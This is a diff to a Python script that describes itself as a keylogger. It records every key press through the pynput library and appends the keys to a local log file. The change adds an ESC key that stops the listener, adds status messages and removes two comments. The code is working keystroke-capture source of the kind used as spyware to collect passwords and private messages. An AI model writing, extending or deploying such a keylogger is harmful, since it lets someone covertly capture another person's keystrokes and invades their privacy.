@@ -2,7 +2,6 @@ from pynput import keyboard
 import datetime
 import os
 
-# Create the log directory and file if not present
 log_file_path = "keylogger/log.txt"
 os.makedirs(os.path.dirname(log_file_path), exist_ok=True)
 
@@ -22,7 +21,11 @@ def on_press(key):
     with open(log_file_path, "a") as log_file:
         log_file.write(log_entry)
 
-# Start listener
+    if key == keyboard.Key.esc:
+        print("[*] ESC pressed. Exiting keylogger.")
+        return False  # This stops the listener
+
 if __name__ == "__main__":
+    print("[*] Keylogger started. Press ESC to stop.")
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
